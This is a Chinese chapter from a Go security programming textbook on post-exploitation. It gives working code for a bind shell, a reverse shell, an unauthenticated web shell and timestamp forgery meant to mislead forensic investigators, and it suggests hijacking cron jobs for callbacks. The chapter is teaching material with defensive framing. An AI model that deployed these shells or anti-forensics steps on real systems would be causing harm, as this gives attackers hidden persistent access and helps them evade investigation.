# 第十三章：后期利用

后期利用指的是渗透测试的一个阶段，在这个阶段，机器已经被利用并且代码执行已可用。主要任务通常是保持持久性，以便你能够保持连接或留下一种稍后重新连接的方式。本章将介绍一些常见的持久性技术，即绑定 Shell、反向绑定 Shell 和 Web Shell。我们还将探讨交叉编译，这在从单一主机为不同操作系统编译 Shell 时非常有用。

后期利用阶段的其他目标包括寻找敏感数据、修改文件以及掩盖痕迹，以防取证人员能够找到证据。你可以通过更改文件的时间戳、修改权限、禁用 Shell 历史记录和删除日志来掩盖痕迹。本章将介绍一些查找有趣文件和掩盖痕迹的技术。

第四章，*取证*，与此密切相关，因为进行取证调查与探索一个刚被利用的机器并没有太大区别。两者的任务都是了解系统上有什么并寻找有趣的文件。同样，第五章，*数据包捕获与注入*，在从一个被利用的主机进行网络分析时也非常有用。许多工具，如查找大文件或查找最近修改的文件，在此阶段也会非常有帮助。有关此阶段可用的更多示例，请参考第四章，*取证*，和第五章，*数据包捕获与注入*。

后期利用阶段涵盖了各种任务，包括特权提升、跳板攻击、窃取或销毁数据、以及主机和网络分析。由于其范围广泛，并且根据所利用的系统类型差异很大，本章将专注于一些在大多数场景中都很有用的狭义话题。

在进行这些练习时，尽量从攻击者的角度来看问题。在处理这些例子时保持这种思维方式将帮助你更好地理解如何保护你的系统。

本章将覆盖以下主题：

+   交叉编译

+   绑定 Shell

+   反向绑定 Shell

+   Web Shell

+   查找具有写权限的文件

+   修改文件时间戳

+   修改文件权限

+   修改文件所有权

# 交叉编译

交叉编译是 Go 语言自带的一个功能，使用起来非常简单。如果你在 Linux 机器上进行渗透测试，且需要编译一个能够在你已经控制的 Windows 机器上运行的自定义反向 Shell，这个功能特别有用。

你可以针对多个架构和操作系统进行构建，所需做的只是修改一个环境变量。无需额外的工具或编译器。Go 内置了这一切。

只需将 `GOARCH` 和 `GOOS` 环境变量更改为匹配你希望构建的目标平台。你可以为 Windows、Mac、Linux 等操作系统进行构建。你还可以为主流的 32 位和 64 位桌面处理器以及用于树莓派等设备的 ARM 和 MIPS 构建。

截至本文撰写时，`GOARCH` 的可能值如下：

| `386` | `amd64` |
| --- | --- |
| `amd64p32` | `arm` |
| `armbe` | `arm64` |
| `arm64be` | `ppc64` |
| `ppc64le` | `mips` |
| `mipsle` | `mips64` |
| `mips64le` | `mips64p32` |
| `mips64p32le` | `ppc` |
| `s390` | `s390x` |
| `sparc` | `sparc64` |

`GOOS` 的选项如下：

| `android` | `darwin` |
| --- | --- |
| `dragonfly` | `freebsd` |
| `linux` | `nacl` |
| `netbsd` | `openbsd` |
| `plan9` | `solaris` |
| `windows` | `zos` |

请注意，并非每种架构都可以与每个操作系统一起使用。请参考 Go 官方文档 ([`golang.org/doc/install/source#environment`](https://golang.org/doc/install/source#environment)) 了解哪些架构和操作系统可以组合使用。

如果你针对的是 ARM 平台，你可以通过设置 `GOARM` 环境变量来可选地指定 ARM 版本。系统会自动选择一个合理的默认值，建议不要更改它。目前可用的 `GOARM` 值有 `5`、`6` 和 `7`。

在 Windows 中，按照此处的说明在命令提示符中设置环境变量：

```
Set GOOS=linux
Set GOARCH=amd64
go build myapp
```

在 Linux/Mac 中，你也可以通过多种方式设置环境变量，但你可以像这样为单个构建命令指定它：

```
GOOS=windows GOARCH=amd64 go build mypackage  
```

阅读更多关于环境变量和交叉编译的信息，参见 [`golang.org/doc/install/source#environment`](https://golang.org/doc/install/source#environment)。

这种交叉编译方法是随着 Go 1.5 引入的。在那之前，Go 开发者提供了一个 shell 脚本，但现在已经不再支持，并且已被归档在 [`github.com/davecheney/golang-crosscompile/tree/archive`](https://github.com/davecheney/golang-crosscompile/tree/archive)。

# 创建绑定 shell

绑定 shell 是一种程序，它绑定到端口并监听连接，提供 shell 服务。每当收到一个连接时，它会运行一个 shell，如 Bash，并将标准输入、输出和错误句柄传递给远程连接。它可以永远监听并为多个传入连接提供 shell 服务。

绑定 shell 在你希望为机器添加持久访问时非常有用。你可以运行绑定 shell，然后断开连接或通过远程代码执行漏洞将绑定 shell 注入到内存中。

绑定 shell 最大的问题是防火墙和 NAT 路由可能会阻止直接远程访问计算机。传入连接通常会被阻止，或者被路由到无法连接到绑定 shell 的方式。基于这个原因，通常使用反向绑定 shell。下一部分将讲解反向绑定 shell。

在 Windows 上编译这个例子时，大小为 1,186 字节。考虑到一些用 C/Assembly 编写的 shell 可以小于 100 字节，这个大小算是相对较大。如果你在利用一个应用程序，你可能会有非常有限的空间来注入一个绑定 shell。你可以通过省略 `log` 包、删除可选的命令行参数以及忽略错误，来使这个示例更小。

可以使用 TLS 来代替明文传输，只需将 `net.Listen()` 替换为 `tls.Listen()`。第六章，*加密学*，提供了一个 TLS 客户端和服务器的示例。

接口是 Go 语言的一个强大特性，这里通过 reader 和 writer 接口展示了它的便利性。满足 reader 和 writer 接口的唯一要求是分别实现 `.Read()` 和 `.Write()` 函数。在这里，网络连接实现了 `Read()` 和 `Write()` 函数，`exec.Command` 也是如此。由于它们实现了共享的接口，我们可以轻松地将 reader 和 writer 接口绑定在一起。

在这个例子中，我们将创建一个 Linux 的绑定 shell，使用内置的`/bin/sh` shell。它将绑定并监听连接，为任何连接的用户提供一个 shell：

```
// Call back to a remote server and open a shell session
package main

import (
   "fmt"
   "log"
   "net"
   "os"
   "os/exec"
)

var shell = "/bin/sh"

func main() {
   // Handle command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Usage: " + os.Args[0] + " <bindAddress>")
      fmt.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")
      os.Exit(1)
   }

   // Bind socket
   listener, err := net.Listen("tcp", os.Args[1])
   if err != nil {
      log.Fatal("Error connecting. ", err)
   }
   log.Println("Now listening for connections.")

   // Listen and serve shells forever
   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Println("Error accepting connection. ", err)
      }
      go handleConnection(conn)
   }

}

// This function gets executed in a thread for each incoming connection
func handleConnection(conn net.Conn) {
   log.Printf("Connection received from %s. Opening shell.", 
   conn.RemoteAddr())
   conn.Write([]byte("Connection established. Opening shell.\n"))

   // Use the reader/writer interface to connect the pipes
   command := exec.Command(shell)
   command.Stdin = conn
   command.Stdout = conn
   command.Stderr = conn
   command.Run()

   log.Printf("Shell ended for %s", conn.RemoteAddr())
} 
```

# 创建反向绑定 shell

反向绑定 shell 解决了防火墙和 NAT 问题。它不是监听传入连接，而是主动拨号到一个远程服务器（一个你控制并且在监听的服务器）。当你在你的计算机上收到连接时，你就拥有了一个运行在防火墙后面的计算机上的 shell。

这个例子使用了明文 TCP 套接字，但你可以轻松地将 `net.Dial()` 替换为 `tls.Dial()`。第六章，*加密学*，提供了 TLS 客户端和服务器的示例，如果你想修改这些示例以使用 TLS。

```
// Call back to a remote server and open a shell session
package main

import (
   "fmt"
   "log"
   "net"
   "os"
   "os/exec"
)

var shell = "/bin/sh"

func main() {
   // Handle command line arguments
   if len(os.Args) < 2 {
      fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
      fmt.Println("Example: " + os.Args[0] + " 192.168.0.27:9999")
      os.Exit(1)
   }

   // Connect to remote listener
   remoteConn, err := net.Dial("tcp", os.Args[1])
   if err != nil {
      log.Fatal("Error connecting. ", err)
   }
   log.Println("Connection established. Launching shell.")

   command := exec.Command(shell)
   // Take advantage of reader/writer interfaces to tie inputs/outputs
   command.Stdin = remoteConn
   command.Stdout = remoteConn
   command.Stderr = remoteConn
   command.Run()
} 
```

# 创建 Web shell

Web shell 类似于绑定 shell，但是它不是作为原始的 TCP 套接字进行监听，而是作为 HTTP 服务器监听和通信。这是一种创建持久访问机器的有用方法。

Web shell 可能是必要的原因之一，是因为防火墙或其他网络限制。HTTP 流量可能与其他流量的处理方式不同。有时，`80` 和 `443` 端口是唯一可以通过防火墙的端口。一些网络可能会检查流量，确保只有格式为 HTTP 的请求可以通过。

请记住，使用纯 HTTP 意味着流量可能以明文记录。可以使用 HTTPS 来加密流量，但 SSL 证书和密钥将存储在服务器上，服务器管理员可以访问它。要使此示例使用 SSL，你只需将`http.ListenAndServe()`更改为`http.ListenAndServeTLS()`。此示例在第九章中提供，*Web 应用程序*。

Web shell 的方便之处在于，你可以使用任何 Web 浏览器和命令行工具，例如`curl`或`wget`。你甚至可以使用`netcat`手动构造 HTTP 请求。缺点是，你没有一个真正交互式的 shell，且每次只能发送一个命令。如果你用分号分隔多个命令，你可以用一条字符串运行多个命令。

你可以手动在`netcat`中或使用类似的自定义 TCP 客户端构造 HTTP 请求，如下所示：

```
GET /?cmd=whoami HTTP/1.0\n\n  
```

这类似于由 Web 浏览器创建的请求。例如，如果你运行`webshell localhost:8080`，你可以访问端口`8080`上的 URL，并使用`http://localhost:8080/?cmd=df`运行命令。

请注意，`/bin/sh`命令适用于 Linux 和 Mac。Windows 使用`cmd.exe`命令提示符。在 Windows 上，你可以启用 Windows 子系统 Linux，并从 Windows 商店安装 Ubuntu，以在不安装虚拟机的情况下在 Linux 环境中运行所有这些 Linux 示例。

在下一个示例中，Web shell 创建了一个简单的 Web 服务器，监听 HTTP 请求。当它收到请求时，它会查找名为`cmd`的`GET`查询。它将执行一个 shell，运行提供的命令，并将结果作为 HTTP 响应返回：

```
package main

import (
   "fmt"
   "log"
   "net/http"
   "os"
   "os/exec"
)

var shell = "/bin/sh"
var shellArg = "-c"

func main() {
   if len(os.Args) != 2 {
      fmt.Printf("Usage: %s <listenAddress>\n", os.Args[0])
      fmt.Printf("Example: %s localhost:8080\n", os.Args[0])
      os.Exit(1)
   }

   http.HandleFunc("/", requestHandler)
   log.Println("Listening for HTTP requests.")
   err := http.ListenAndServe(os.Args[1], nil)
   if err != nil {
      log.Fatal("Error creating server. ", err)
   }
}

func requestHandler(writer http.ResponseWriter, request *http.Request) {
   // Get command to execute from GET query parameters
   cmd := request.URL.Query().Get("cmd")
   if cmd == "" {
      fmt.Fprintln(
         writer,
         "No command provided. Example: /?cmd=whoami")
      return
   }

   log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)
   fmt.Fprintf(writer, "You requested command: %s\n", cmd)

   // Run the command
   command := exec.Command(shell, shellArg, cmd)
   output, err := command.Output()
   if err != nil {
      fmt.Fprintf(writer, "Error with command.\n%s\n", err.Error())
   }

   // Write output of command to the response writer interface
   fmt.Fprintf(writer, "Output: \n%s\n", output)
} 
```

# 查找可写文件

一旦你获得了系统的访问权限，你会开始探索。通常，你会寻找提升权限或保持持久性的方式。寻找持久性的方法之一是识别哪些文件具有写权限。

你可以查看文件权限设置，看看你自己或其他人是否具有写权限。你可以显式查找像`777`这样的模式，但更好的方法是使用位掩码，专门查看写权限位。

权限由多个位表示：用户权限、组权限，最后是每个人的权限。`0777`权限的字符串表示形式如下：`-rwxrwxrwx`。我们关注的位是赋予每个人写权限的位，表示为`--------w-`。

第二个位是我们唯一关心的，因此我们将使用按位与操作将文件权限与`0002`进行掩码。如果该位被设置，它将保持唯一的设置。如果未设置，它将保持关闭，整个值将为`0`。要检查组或用户的写权限位，你可以分别使用`0020`和`0200`进行按位与操作。

要递归地搜索目录，Go 提供了标准库中的`path/filepath`包。此函数只需要一个起始目录和一个函数。它会对找到的每个文件执行该函数。它期望的函数实际上是一个特别定义的类型。定义如下：

```
type WalkFunc func(path string, info os.FileInfo, err error) error  
```

只要你创建一个匹配此格式的函数，你的函数就会与`WalkFunc`类型兼容，并且可以在`filepath.Walk()`函数中使用。

在下一个示例中，我们将遍历一个起始目录并检查每个文件的权限。我们还会检查子目录。任何当前用户可以写入的文件将被打印到标准输出：

```
package main

import (
   "fmt"
   "log"
   "os"
   "path/filepath"
)

func main() {
   if len(os.Args) != 2 {
      fmt.Println("Recursively look for files with the " + 
         "write bit set for everyone.")
      fmt.Println("Usage: " + os.Args[0] + " <path>")
      fmt.Println("Example: " + os.Args[0] + " /var/log")
      os.Exit(1)
   }
   dirPath := os.Args[1]

   err := filepath.Walk(dirPath, checkFilePermissions)
   if err != nil {
      log.Fatal(err)
   }
}

func checkFilePermissions(
   path string,
   fileInfo os.FileInfo,
   err error,
) error {
   if err != nil {
      log.Print(err)
      return nil
   }

   // Bitwise operators to isolate specific bit groups
   maskedPermissions := fileInfo.Mode().Perm() & 0002
   if maskedPermissions == 0002 {
      fmt.Println("Writable: " + fileInfo.Mode().Perm().String() + 
         " " + path)
   }

   return nil
} 
```

# 更改文件时间戳

以与修改文件权限相同的方式，你可以修改时间戳，使其看起来像是过去或未来修改过的。这在掩盖痕迹时非常有用，可以让文件看起来像是很久没有访问过，或者将其设置为未来的某个日期，以混淆取证调查人员。Go 的`os`包包含了修改文件的工具。

在下一个示例中，一个文件的时间戳被修改为看起来像是在未来被修改。你可以调整`futureTime`变量，使文件看起来像是在任何特定时间被修改。这个示例通过将当前时间加上 50 小时 15 分钟来提供一个相对时间，但你也可以指定一个绝对时间：

```
package main

import (
   "fmt"
   "log"
   "os"
   "time"
)

func main() {
   if len(os.Args) != 2 {
      fmt.Printf("Usage: %s <filename>", os.Args[0])
      fmt.Printf("Example: %s test.txt", os.Args[0])
      os.Exit(1)
   }

   // Change timestamp to a future time
   futureTime := time.Now().Add(50 * time.Hour).Add(15 * time.Minute)
   lastAccessTime := futureTime
   lastModifyTime := futureTime
   err := os.Chtimes(os.Args[1], lastAccessTime, lastModifyTime)
   if err != nil {
      log.Println(err)
   }
} 
```

# 更改文件权限

更改文件权限，以便稍后从较低权限的用户访问该文件也可能很有用。这个示例演示了如何使用`os`包更改文件权限。你可以轻松地使用`os.Chmod()`函数更改文件权限。

这个程序被命名为`chmode.go`，以避免与大多数系统上提供的默认`chmod`程序发生冲突。它具有与`chmod`相同的基本功能，但没有额外的功能。

`os.Chmod()`函数非常简单，但必须提供`os.FileMode`类型。`os.FileMode`类型其实只是一个`uint32`类型，因此你可以提供一个`uint32`字面量（硬编码数字），或者你必须确保提供的文件模式值已转换为`os.FileMode`类型。在这个例子中，我们将从命令行获取字符串值（例如，`"777"`），并将其转换为无符号整数。我们会告诉`strconv.ParseUint()`将其视为八进制数字，而不是十进制数字。我们还会提供`strconv.ParseUint()`一个 32 的参数，这样我们将返回 32 位数字，而不是 64 位数字。在获得来自字符串值的无符号 32 位整数后，我们将其转换为`os.FileMode`类型。这就是标准库中`os.FileMode`的定义方式：

```
type FileMode uint32  
```

在下一个示例中，文件的权限被更改为作为命令行参数提供的值。它的行为类似于 Linux 中的`chmod`程序，并接受八进制格式的权限值：

```
package main

import (
   "fmt"
   "log"
   "os"
   "strconv"
)

func main() {
   if len(os.Args) != 3 {
      fmt.Println("Change the permissions of a file.")
      fmt.Println("Usage: " + os.Args[0] + " <mode> <filepath>")
      fmt.Println("Example: " + os.Args[0] + " 777 test.txt")
      fmt.Println("Example: " + os.Args[0] + " 0644 test.txt")
      os.Exit(1)
   }
   mode := os.Args[1]
   filePath := os.Args[2]

   // Convert the mode value from string to uin32 to os.FileMode
   fileModeValue, err := strconv.ParseUint(mode, 8, 32)
   if err != nil {
      log.Fatal("Error converting permission string to octal value. ", 
         err)
   }
   fileMode := os.FileMode(fileModeValue)

   err = os.Chmod(filePath, fileMode)
   if err != nil {
      log.Fatal("Error changing permissions. ", err)
   }
   fmt.Println("Permissions changed for " + filePath)
} 
```

# 更改文件所有权

该程序将接受提供的文件并更改用户和组的所有权。这可以与查找你有权限修改的文件的示例一起使用。

Go 标准库提供了`os.Chown()`，但是它不接受用户和组名称的字符串值。用户和组必须以整数 ID 值的形式提供。幸运的是，Go 还带有一个`os/user`包，其中包含根据名称查找 ID 的函数。这些函数是`user.Lookup()`和`user.LookupGroup()`。

你可以通过在 Linux/Mac 上运行`id`、`whoami`和`groups`命令来查看你自己的用户和组信息。

请注意，这在 Windows 上不起作用，因为所有权的处理方式不同。以下是该示例的代码实现：

```
package main

import (
   "fmt"
   "log"
   "os"
   "os/user"
   "strconv"
)

func main() {
   // Check command line arguments
   if len(os.Args) != 4 {
      fmt.Println("Change the owner of a file.")
      fmt.Println("Usage: " + os.Args[0] + 
         " <user> <group> <filepath>")
      fmt.Println("Example: " + os.Args[0] +
         " dano dano test.txt")
      fmt.Println("Example: sudo " + os.Args[0] + 
         " root root test.txt")
      os.Exit(1)
   }
   username := os.Args[1]
   groupname := os.Args[2]
   filePath := os.Args[3]

   // Look up user based on name and get ID
   userInfo, err := user.Lookup(username)
   if err != nil {
      log.Fatal("Error looking up user "+username+". ", err)
   }
   uid, err := strconv.Atoi(userInfo.Uid)
   if err != nil {
      log.Fatal("Error converting "+userInfo.Uid+" to integer. ", err)
   }

   // Look up group name and get group ID
   group, err := user.LookupGroup(groupname)
   if err != nil {
      log.Fatal("Error looking up group "+groupname+". ", err)
   }
   gid, err := strconv.Atoi(group.Gid)
   if err != nil {
      log.Fatal("Error converting "+group.Gid+" to integer. ", err)
   }

   fmt.Printf("Changing owner of %s to %s(%d):%s(%d).\n",
      filePath, username, uid, groupname, gid)
   os.Chown(filePath, uid, gid)
} 
```

# 总结

阅读完这一章后，你应该对攻击后的利用阶段有了一个高层次的理解。通过操作示例并从攻击者的角度思考，你应该能更好地理解如何保护你的文件和网络。这个阶段主要涉及持久性和信息收集。你还可以使用被利用的机器来执行第十一章中的所有示例，*主机发现与枚举*。

绑定 shell、反向绑定 shell 和 Web shell 是攻击者用来保持持久性的技术示例。即使你不需要使用绑定 shell，理解它是什么以及攻击者如何使用它也很重要，如果你想识别恶意行为并保持系统安全。你可以使用第十一章中的端口扫描示例，*主机发现与枚举*，来搜索具有监听绑定 shell 的机器。你还可以使用第五章中的数据包捕获示例，*数据包捕获与注入*，来查找传出的反向绑定 shell。

查找可写文件可以为你提供查看文件系统所需的工具。`Walk()`函数的演示非常强大，可以适应许多不同的用例。你可以轻松调整它，搜索具有不同特征的文件。例如，可能你想缩小搜索范围，查找由 root 拥有但同时对你可写的文件，或者查找某种特定扩展名的文件。

一旦你获得访问权限后，还会在机器上查找哪些其他内容？你能想到其他任何方法来恢复连接吗？Cron 作业是你可以执行代码的一种方式，如果你发现一个 Cron 作业执行了一个你有写权限的脚本。如果你能够修改一个 Cron 脚本，那么你可能每天都能通过反向 shell 回拨给你，这样你就不需要保持一个活跃的会话，而这种会话更容易通过像`netstat`这样的工具来识别已建立的连接。

记住，在进行渗透测试或执行任何测试时，要始终保持责任心。即使你拥有完整的测试范围，理解你所采取的任何行动可能带来的后果也是至关重要的。例如，如果你为客户执行渗透测试，并且拥有完整的范围，你可能会在生产系统上发现一个漏洞。你可能会考虑安装一个 bind shell 后门来证明你能维持持久性。如果我们考虑到面对互联网的生产服务器，在没有加密且没有密码的情况下，将一个 bind shell 开放给整个互联网，显然是非常不负责任的。如果你对某些软件或命令的后果不确定，别害怕向其他有经验的人请教。

在下一章中，我们将回顾你在本书中学到的内容。我将提供一些关于 Go 语言在安全领域应用的思考，希望你能从本书中收获这些见解，并讨论从这里出发应该走向何方，以及在哪里寻找帮助。我们还将再次反思使用本书中的信息时涉及的法律、伦理和技术边界。
